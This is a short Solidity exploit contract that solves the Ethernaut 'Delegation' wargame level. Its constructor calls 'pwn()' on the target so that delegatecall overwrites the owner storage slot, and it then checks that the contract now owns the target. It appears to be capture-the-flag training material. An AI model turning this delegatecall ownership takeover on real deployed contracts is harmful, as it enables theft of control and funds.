// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../../contracts/contracts/levels/Delegation.sol';
import '../../contracts/contracts/levels/DelegationFactory.sol';
import 'hardhat/console.sol';

contract Exploit {
    Delegation public target;

    //delegate and delegation storagge overlap
    constructor (Delegation _target) public {

        target = _target;
        (bool success, ) = address(target).call(abi.encodeWithSignature('pwn()'));
        console.log(success);
        require(address(this) == target.owner(), "unexpected target owner");
    }
}
